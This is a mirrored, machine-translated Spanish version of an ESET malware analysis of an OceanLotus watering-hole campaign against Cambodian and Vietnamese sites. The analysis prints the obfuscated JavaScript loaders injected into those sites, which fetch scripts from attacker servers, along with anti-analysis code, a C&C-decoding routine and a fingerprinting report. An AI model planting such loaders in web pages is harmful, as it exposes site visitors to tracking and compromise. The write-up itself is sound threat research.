<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∏ üöô üíµ OceanLotus: ataque a un pozo de agua en el sudeste asi√°tico üìµ ‚òùüèº üí•</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Los especialistas de ESET analizaron la nueva campa√±a de abrevaderos, que apunta a m√∫ltiples sitios en el sudeste asi√°tico. Supuestamente, los atacant...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus: ataque a un pozo de agua en el sudeste asi√°tico</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  Los especialistas de ESET analizaron la nueva campa√±a de abrevaderos, que apunta a m√∫ltiples sitios en el sudeste asi√°tico.  Supuestamente, los atacantes han estado operando desde principios de septiembre de 2018.  La campa√±a es diferente en escala: logramos descubrir 21 recursos comprometidos, incluidos los sitios web del Ministerio de Defensa de Camboya, el Ministerio de Relaciones Exteriores y Cooperaci√≥n Internacional de Camboya, as√≠ como varios peri√≥dicos y blogs vietnamitas. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br>  Seg√∫n el an√°lisis, descubrimos que la campa√±a la lleva a cabo el grupo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">OceanLotus</a> , tambi√©n conocido como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ART32</a> y ART-S-00.  El grupo ha estado operando desde al menos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">2012</a> y se especializa en ciberespionaje, con un inter√©s particular en agencias gubernamentales y disidentes. <br><br><a name="habracut"></a>  La campa√±a parece ser una evoluci√≥n del esquema de pozos de agua OceanLotus, que los investigadores de Volexity <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">documentaron</a> en 2017 bajo el nombre de Marco B. Desde el a√±o pasado, el grupo cibern√©tico aprendi√≥ a dificultar el an√°lisis de sus marcos maliciosos.  Entre otras mejoras, notamos el uso del cifrado de clave p√∫blica para intercambiar la clave de sesi√≥n AES.  El m√©todo se utiliza para cifrar el intercambio de datos que no permite que los productos de seguridad intercepten la carga √∫til final.  Adem√°s, los atacantes cambiaron de HTTP a WebSocket para ocultar el intercambio de datos maliciosos. <br><br>  Cada uno de los sitios comprometidos descubiertos por los expertos de ESET redirigi√≥ a los visitantes a un dominio separado controlado por OceanLotus. <br><br>  La siguiente imagen muestra las regiones objetivo de la campa√±a. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Figura 1. Geograf√≠a de sitios comprometidos</i> <br><br>  Los dominios m√°s comprometidos son los medios de comunicaci√≥n o est√°n relacionados con el gobierno de Camboya.  La siguiente es una lista de v√≠ctimas.  Les advertimos sobre comprometerse en octubre, pero a fines de 2018, los scripts maliciosos permanecieron en algunos sitios: <br><br>  - baotgm [.] Net - Medios de comunicaci√≥n vietnamitas (sede en Arlington, Texas) <br>  - cnrp7 [.] Org - Sitio web del Partido de Salvaci√≥n Nacional de Camboya <br>  - conggiaovietnam [.] Net - contenido religioso en vietnamita <br>  - daichungvienvinhthanh [.] Com - contenido religioso en vietnamita <br>  - informaci√≥n danchimviet [.] - medios vietnamitas <br>  - danviet [.] Vn - medios vietnamitas <br>  - danviethouston [.] Com - medios vietnamitas <br>  - fvpoc [.] Org - Organizaci√≥n p√∫blica vietnamita <br>  - gardencityclub [.] Com - sitio del club de golf en Phnom Penh, Camboya <br>  - lienketqnhn [.] Org - Medios vietnamitas <br>  - mfaic.gov [.] Kh - Ministerio de Relaciones Exteriores y Cooperaci√≥n Internacional de Camboya <br>  - mod.gov [.] Kh - Ministerio de Defensa de Camboya <br>  - mtgvinh [.] Net - contenido religioso en vietnamita <br>  - nguoitieudung.com [.] Vn - Medios vietnamitas <br>  - phnompenhpost [.] Com - Medios camboyanos en ingl√©s <br>  - raovatcalitoday [.] Com - sitio en vietnamita <br>  - thongtinchongphandong [.] Com - medios de oposici√≥n en vietnamita <br>  - tinkhongle [.] Com - medios vietnamitas <br>  - toithichdoc.blogspot [.] Com - Blog vietnamita <br>  - trieudaiviet [.] Com - sitio en vietnamita <br>  - triviet [.] News - Medios de comunicaci√≥n vietnamitas <br><br>  En los ataques a los pozos de agua, los atacantes generalmente comprometen sitios que con frecuencia son visitados por v√≠ctimas potenciales.  Sin embargo, en esta campa√±a, el grupo OceanLotus comprometi√≥ varios sitios populares.  A continuaci√≥n se muestra una lista de sitios comprometidos y su <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">clasificaci√≥n de Alexa</a> : global y en el pa√≠s donde el sitio es m√°s popular.  Por ejemplo, el sitio web del peri√≥dico Dan Viet (danviet [.] Vn) a fines de 2018 estaba en la l√≠nea 116 en t√©rminos de asistencia en Vietnam. <br><br>  - Danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - informaci√≥n danchimviet [.] - 287 852/144 884 <br>  - baotgm [.] Net - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1,040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1.778.418 / 23.428 <br>  - mod.gov [.] Kh - 4,247,649 / 3,719 <br><br><h3>  An√°lisis </h3><br>  Para todos los sitios comprometidos, se utilizaron m√©todos similares.  Los atacantes agregaron un peque√±o fragmento de c√≥digo JavaScript a la p√°gina principal o a un archivo JavaScript publicado en el mismo servidor.  Un fragmento de c√≥digo ligeramente ofuscado (ver m√°s abajo) carga otro script desde un servidor controlado por el atacante.  A continuaci√≥n se incluye un fragmento de JavaScript en <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> , que descarga el archivo desde <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  Para evitar ser detectados, los atacantes tomaron las siguientes medidas: <br><br>  - Ofuscan las secuencias de comandos para evitar que se asignen URL finales est√°ticas <br>  - La URL se parece a la biblioteca de JavaScript real utilizada por el sitio <br>  - Para cada sitio comprometido, se utiliza un dominio y URI separados. <br>  - Todos los sitios comprometidos tienen diferentes scripts.  El siguiente es un script que se est√° implementando en uno de los sitios comprometidos: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  Primera etapa </h3><br>  Seg√∫n la ubicaci√≥n de la direcci√≥n IP del visitante, el servidor de la primera etapa (por ejemplo, <code>weblink.selfip[.]info</code> for <code>mfaic.gov[.]kh</code> ) transmite un script falso (biblioteca JavaScript leg√≠tima aleatoria) o un script de la primera etapa (por ejemplo, SHA- 1: 2194271C7991D60AE82436129D7F25C0A689050A).  No todos los servidores realizan comprobaciones de ubicaci√≥n, pero si hay uno, solo los visitantes de Vietnam y Camboya reciben un script malicioso. <br><br>  El script de la primera etapa tiene varias comprobaciones para evitar la detecci√≥n, como se muestra a continuaci√≥n. <br><br><pre> <code class="javascript hljs">[‚Ä¶] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } [‚Ä¶]</code> </pre> <br>  El gui√≥n espera hasta que la v√≠ctima se desplaza a la p√°gina.  Tambi√©n verifica la resoluci√≥n de la ventana y si Firebug, un complemento basado en navegador para analizar p√°ginas web, est√° habilitado.  Si al menos una de las verificaciones falla, la ejecuci√≥n finaliza. <br><br>  Luego descifra el dominio del servidor de comando C&amp;C usando un algoritmo personalizado.  Por ejemplo, 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 significa <code>wss://tcog.thruhere[.]net</code> .  Para cada dominio de la primera etapa, los atacantes registraron adicionalmente el dominio de la segunda etapa, y todos est√°n ubicados en diferentes servidores.  El siguiente c√≥digo es el equivalente de la funci√≥n de descifrado escrita en Python. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  Despu√©s de descifrar la direcci√≥n de C&amp;C, el script env√≠a una cadena √∫nica de 15 d√≠gitos y luego recibe y ejecuta el script de la segunda etapa.  El intercambio de datos se realiza a trav√©s de WebSocket o SSL.  El protocolo proporciona comunicaci√≥n bidireccional simult√°nea entre el cliente y el servidor.  Esto significa que despu√©s de que un cliente establece una conexi√≥n, el servidor puede enviar datos al cliente incluso sin una solicitud.  Sin embargo, en un caso particular, el protocolo se usa principalmente para evitar la detecci√≥n. <br><br><h3>  Segunda etapa </h3><br>  El gui√≥n de la segunda etapa es para el reconocimiento.  Los desarrolladores de OceanLotus utilizaron la biblioteca fingerprintjs2 de Valve, disponible en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GitHub</a> , con peque√±os cambios, agregando el uso compartido de red y creando un informe especial. <br><br>  La siguiente figura muestra las diversas acciones realizadas por el script.  La comunicaci√≥n se realiza a trav√©s de una sesi√≥n de WebSocket que comenz√≥ con el primer paso. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Figura 2. Esquema de la segunda etapa de la carga √∫til.</i> <br><br>  La comunicaci√≥n se cifra utilizando la clave de sesi√≥n AES generada por el servidor.  Se cifra con una clave p√∫blica RSA de 1024 bits y se env√≠a al cliente, por lo que no es posible descifrar el intercambio de datos entre el cliente y el servidor. <br><br>  En comparaci√≥n con las versiones anteriores del marco del abrevadero OceanLotus, es m√°s dif√≠cil protegerse de esto porque la transmisi√≥n de datos a trav√©s de la red no se puede detectar ni descifrar.  Esto evita el descubrimiento de datos en la red.  La clave p√∫blica transmitida por el servidor no cambia y se enumera en la secci√≥n IoC. <br><br>  El script de reconocimiento crea un informe similar al siguiente y lo env√≠a al servidor C&amp;C de la segunda etapa. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  Este informe es casi id√©ntico al otro generado por <a href="">OceanLotus Framework B</a> , documentado por Volexity en 2017.  Sus secciones son similares y contienen errores tipogr√°ficos id√©nticos.  Debido a esta similitud y ubicaci√≥n de los objetivos, podemos decir con un alto grado de certeza que OceanLotus est√° llevando a cabo la campa√±a. <br><br>  El informe generado contiene informaci√≥n detallada sobre el navegador de la v√≠ctima y el sitio visitado: agente de usuario, encabezado de solicitud de referencia HTTP, direcci√≥n IP local y externa, complementos y configuraci√≥n de idioma del navegador. <br><br>  Adem√°s, cada m√°quina tiene dos identificadores √∫nicos: <i>client_zuuid</i> y <i>client_uuid</i> .  Pueden usarse para identificar usuarios y rastrear sus visitas.  Estos identificadores estaban realmente presentes en la versi√≥n 2017 del marco, y <i>client_uuid se</i> calcul√≥ de manera similar. <br><br>  El valor de <i>client_zuuid</i> es la concatenaci√≥n de los diversos valores de deviceId contenidos en navigator.mediaDevices.enumerateDevices.  Los dispositivos son dispositivos externos a los que el navegador tiene acceso, como c√°maras y micr√≥fonos.  Por lo tanto, el valor para un usuario debe coincidir durante diferentes visitas desde la misma computadora. <br><br>  El valor de <i>client_uuid</i> es el hash MD5 de las huellas digitales asignadas por fingerprintjs2.  Los datos recopilados incluyen el agente de usuario del navegador, el idioma, la zona horaria, los complementos del navegador y las fuentes accesibles para el navegador.  Y nuevamente: el valor debe ser id√©ntico para todas las visitas, solo si, por ejemplo, el usuario no actualiza el navegador o no inicia sesi√≥n desde otro dispositivo. <br><br>  Finalmente, el servidor puede enviar c√≥digo JavaScript adicional a la computadora de la v√≠ctima, quiz√°s este es el componente entregado.  Desafortunadamente, debido al uso de la clave de sesi√≥n AES para descifrar el intercambio de datos, no pudimos determinar qu√© componente entregan los intrusos en las muestras en libertad.  Adem√°s, la carga √∫til se entrega solo a ciertas v√≠ctimas.  Por lo tanto, al usar una m√°quina de prueba, no pudimos obtenerlos.  Sin embargo, seg√∫n informes anteriores, las campa√±as de abrevaderos de OceanLotus est√°n dirigidas al phishing.  Por ejemplo, Volexity en un informe <a href="">escribi√≥</a> que los usuarios vieron una ventana emergente pidi√©ndoles que autorizaran el acceso a trav√©s del protocolo abierto OAuth a la cuenta de Google de la v√≠ctima para la aplicaci√≥n Google OceanLotus.  Con esta t√©cnica, los atacantes pueden acceder a los contactos y correos electr√≥nicos de la v√≠ctima. <br><br><h3>  Infraestructura de red </h3><br>  Para un trabajo encubierto m√°ximo, los operadores de OceanLotus registraron un dominio para la primera y segunda etapa para cada uno de los sitios comprometidos.  Cada dominio est√° alojado en un servidor separado con su propia direcci√≥n IP.  Al menos 50 dominios y 50 servidores est√°n registrados para esta campa√±a. <br><br>  La mayor√≠a de los dominios de la primera etapa est√°n registrados en servicios con nombres de dominio gratuitos, dominios de la segunda etapa, principalmente en los pagos.  Entre otras cosas, sus nombres se disfrazan de leg√≠timos.  A continuaci√≥n se muestra una lista de servicios que los atacantes intentaron copiar: C&amp;C y un dominio leg√≠timo, respectivamente: <br><br>  - cdn-ampproject [.] Com / cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  La cantidad de dominios utilizados y su similitud con sitios leg√≠timos pueden complicar la detecci√≥n por parte de una persona que ve el tr√°fico de la red. <br><br><h3>  Conclusi√≥n </h3><br>  A pesar de la atenci√≥n de los investigadores de seguridad, OceanLotus contin√∫a atacando con √©xito objetivos en el sudeste asi√°tico.  Adem√°s, el grupo mejora sus herramientas al incluir en su arsenal un marco para ataques de abrevaderos, un malware para Windows y macOS.  Las actualizaciones recientes del marco discutidas en este informe indican que los atacantes han mejorado sus habilidades. <br><br>  Para limitar el n√∫mero de posibles v√≠ctimas, notificamos a los propietarios de los sitios comprometidos y les explicamos c√≥mo eliminar el c√≥digo JavaScript malicioso.  Sin embargo, algunos de ellos no mostraron voluntad de aceptar informaci√≥n y asistencia. <br><br>  Los investigadores de ESET continuar√°n monitoreando el desarrollo del grupo OceanLotus.  Los indicadores de compromiso se pueden encontrar en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GitHub</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es436136/">https://habr.com/ru/post/es436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es436126/index.html">Kubernetes: construyendo im√°genes de Docker en un cl√∫ster</a></li>
